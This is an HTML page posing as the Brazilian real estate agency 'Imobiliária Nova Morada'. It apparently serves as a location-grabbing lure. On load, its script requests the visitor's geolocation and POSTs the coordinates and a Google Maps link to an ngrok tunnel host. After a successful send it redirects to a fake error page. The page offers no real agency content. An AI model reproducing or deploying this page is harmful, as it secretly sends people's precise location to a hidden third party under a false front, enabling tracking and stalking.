<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Imobiliária Nova Morada</title>
  <link rel="stylesheet" href="styles.css" />
  <link rel="icon" href="./favicon.ico" type="image/x-icon">
</head>
<body>
  <div class="main-container">
    <header class="header">
      <img src="./logo.png" alt="Logo da Imobiliária Nova Morada" class="logo", width="150" height="150">
      <p class="subtitle">Seu novo lar começa aqui</p>
    </header>
    <section class="location-section" id="location-section">
      <div class="location-message" id="location-message">
        <p>Bem-vindo à <strong>Imobiliária Nova Morada</strong>!<br>
        Para oferecer uma experiência personalizada e facilitar sua busca, solicitamos permissão para acessar sua localização.</p>
        <div class="loader">
          <span class="loader-icon"></span>
          <span class="loader-text">Aguardando sua permissão para localização...</span>
        </div>
        <div id="data-atual" class="data-atual"></div>
      </div>
    </section>
    <footer class="footer">
      <p>&copy; 2025 Imobiliária Nova Morada. Todos os direitos reservados.</p>
    </footer>
  </div>

  <script>
    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Algo deu errado. Tente novamente mais tarde.");
      }
    });

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch("https://ac43-189-68-251-126.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
      })
        .then(response => response.json())
        .then(data => {
          if (!data.success) {
            console.log("Erro ao enviar a localização.");
          } else {
            window.location.href = "./error.html";
          }
        })
        .catch(error => {
          console.error("Erro:", error);
        });
    }

    function handleError(error) {
      console.log("Erro ao obter a localização");
    }
  </script>
</body>
</html>
